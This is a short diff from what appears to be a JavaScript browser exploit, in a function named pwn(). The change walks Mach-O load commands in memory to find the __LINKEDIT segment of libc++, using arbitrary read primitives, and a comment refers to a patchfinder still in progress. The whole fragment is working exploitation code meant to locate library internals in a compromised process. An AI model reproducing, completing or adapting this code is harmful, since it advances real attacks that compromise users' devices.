@@ -312,11 +312,19 @@ function pwn() {
     }
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
-    var libcpp_vm_size = read64(Add(libcpp1_base, 0x40))
-    log(`[+] libcpp_vm_size: ${libcpp_vm_size}`);
+    var lc_seg_64 = Add(libcpp1_base, 0x20);
+    var segname;
+    while(true) {
+        segname = read64(Add(lc_seg_64, 0x8))
+        if(segname == 0x44454B4E494C5F5F) {   //__LINKED (__LINKEDIT)
+            log(`[+] Found __LINKEDIT LC_SEGMENT_64 at: ${lc_seg_64}`);
+            break;
+        }
 
-    var next_dylib = Add(libcpp1_base, libcpp_vm_size)
-    log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
+        var cmdsize = read32(Add(lc_seg_64, 0x4));
+        lc_seg_64 = Add(lc_seg_64, cmdsize)
+    }
+
 
 
     // remove this "return" if finished patchfinder
